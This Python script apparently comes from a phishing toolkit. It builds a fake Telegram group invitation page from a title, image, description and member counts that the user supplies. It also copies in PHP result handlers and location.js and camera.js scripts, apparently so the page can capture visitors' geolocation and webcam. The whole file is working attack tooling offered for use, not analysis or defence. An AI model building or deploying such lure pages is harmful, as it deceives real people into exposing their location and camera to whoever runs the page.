#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
desc = os.getenv('DESC')
mem_num = os.getenv('MEM_NUM')
online_num = os.getenv('ONLINE_NUM')

if title is None:
    title = input(f'{G}[+] {C}Group Title : {W}')
else:
    utils.print(f'{G}[+] {C}Group Title :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Image Path (Best Size : 300x300): {W}')
else:
    utils.print(f'{G}[+] {C}Image :{W} '+image)

if desc is None:
    desc = input(f'{G}[+] {C}Group Description: {W}')
else:
    utils.print(f'{G}[+] {C}Group Description :{W} '+desc)

if mem_num is None:
    mem_num = input(G + '[+]' + C + ' Number of Members : ' + W)
else:
    utils.print(f'{G}[+] {C}Number of Members :{W} '+mem_num)

if online_num is None:
    online_num = input(G + '[+]' + C + ' Number of Members Online : ' + W)
else:
    utils.print(f'{G}[+] {C}Number of Members Online :{W} '+mem_num)

img_name = utils.downloadImageFromUrl(image, 'template/telegram_cam/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/telegram_cam/images/{}'.format(img_name))
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
        exit()

with open('template/telegram_cam/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$MEMBERS$', mem_num)
    code = code.replace('$ONLINE$', online_num)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

# Copiar los archivos PHP necesarios a la carpeta del template
shutil.copyfile('php/result.php', 'template/telegram_cam/result_handler.php')
shutil.copyfile('php/info.php', 'template/telegram_cam/info_handler.php')
shutil.copyfile('php/error.php', 'template/telegram_cam/error_handler.php')

# Crear directorio js si no existe
js_dir = 'template/telegram_cam/js'
if not os.path.exists(js_dir):
    os.makedirs(js_dir)

# Copiar los archivos JavaScript necesarios
shutil.copyfile('js/location.js', 'template/telegram_cam/js/location.js')
shutil.copyfile('js/camera.js', 'template/telegram_cam/js/camera.js')

with open('template/telegram_cam/index.html', 'w') as new_index:
    new_index.write(code)